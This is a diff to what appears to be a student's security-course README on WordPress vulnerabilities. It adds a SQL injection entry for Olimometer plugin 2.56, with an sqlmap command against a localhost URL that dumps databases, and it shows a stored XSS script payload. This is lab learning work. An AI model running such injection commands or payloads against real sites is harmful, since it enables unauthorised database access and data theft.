@@ -36,41 +36,25 @@ Time spent: **10** hours spent in total
 	2. **Find a comment to post on**
 	3. **Post a javascript tag in the comment box**
 	4. Example: ```<script>alert('XSS!');</script>```
-### 3. (Required) Vulnerability Name or ID
-  - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: -
-
-## Assets
-
-List any additional assets, such as scripts or files
+	
+### 3. SQL Injection Olimometer_id Plugin
+  - [x] Summary: 
+    - Vulnerability types: SQL Injection
+    - Tested in version: 2.56
+    - Fixed in version: ***Not Fixed as of currently***
+  - [x] GIF Walkthrough: <img src="SQL_injection.gif">
+  - [x] Steps to recreate: 
+	1. Download **Olimometer Plugin** for Word Press
+	2. Run SQL map with this command
+		```***sqlmap -u http://localhost:8080/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 --dbs --threads=5 --random-agent --no-cast***```
+	3. It should dumb two databases ```exampldb``` and ```information_schema```
 
 ## Resources
 
-- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
-- [WordPress Developer Reference](https://developer.wordpress.org/reference/)
+- [WordPress Scan] (https://wpscan.com)
 
 GIFs created with Screen To GIF
 
 ## Notes
 
-Describe any challenges encountered while doing the work
-
-## License
-
-    Copyright [yyyy] [name of copyright owner]
-
-    Licensed under the Apache License, Version 2.0 (the "License");
-    you may not use this file except in compliance with the License.
-    You may obtain a copy of the License at
-
-        http://www.apache.org/licenses/LICENSE-2.0
-
-    Unless required by applicable law or agreed to in writing, software
-    distributed under the License is distributed on an "AS IS" BASIS,
-    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-    See the License for the specific language governing permissions and
-    limitations under the License.
+**DO NOT FOR THE LOVE OF GOD UPDATE WORDPRESS WHEN DOING THIS UNIT, IT WAS A PAIN TO UNDO.**
